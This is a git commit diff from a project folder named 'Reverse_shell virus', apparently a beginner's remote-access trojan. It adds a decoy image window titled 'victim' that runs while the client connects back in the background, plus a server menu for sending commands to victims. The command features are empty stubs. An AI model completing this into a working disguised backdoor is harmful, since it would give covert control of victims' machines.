73be3caf345725297619e3b3e89a38fdefeeba36
Saman-Asghari <samansadat1383@gmail.com>
2024-03-31 01:17:27 +0330

    adding victim trap

--- Network/Reverse_shell virus/client.py
+++ Network/Reverse_shell virus/client.py
@@ -1,12 +1,39 @@
 import socket
+import threading
+import tkinter as tk
+
+
+
 HOST=socket.gethostbyname(socket.gethostname())
 PORT=12345
 client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-def running():
+
+
+def background():
     client.connect((HOST,PORT))
     print("connectd sucssefully!!")
     while True:
         y=0
         y=y+1
 
-running()
+def front():
+    root=tk.Tk()
+    root.title("victim")
+    root.geometry("1000x450")
+    photo=tk.PhotoImage(file="photo.png")
+    label=tk.Label(root,image=photo,width=1000,height=450,bg="black",fg="yellow")
+    label.pack()
+    root.mainloop()
+
+
+
+def start():
+    background_thread=threading.Thread(target=background)
+    background_thread.start()
+    front_thread=threading.Thread(target=front)
+    front_thread.start()
+    while 1:
+        pass
+
+
+start()
--- Network/Reverse_shell virus/server.py
+++ Network/Reverse_shell virus/server.py
@@ -22,12 +22,35 @@ def connection_accepter():
         print(f"the number of active connection is {client_counter}")
 
 
+def showing_menu():
+    print("1.show the number of connectiones")
+    print("2.send a command to a victim")
+    print("3.send all users a command")
+
+
+def program_handler():
+    print("welcome to the menu")
+    end_of_program=False
+    while not end_of_program:
+        showing_menu()
+        choice=int(input())
+        if(choice==1):
+            pass
+        if(choice==2):
+            pass
+        if(choice==3):
+            pass
+
+
 def start():
     connection_thread=threading.Thread(target=connection_accepter)
     connection_thread.start()
+   # handeling_thread=threading.Thread(target=program_handler)
+   # handeling_thread.start()
+
     x=0
     while 1:
         x=x+1
-
+    
     
 start()
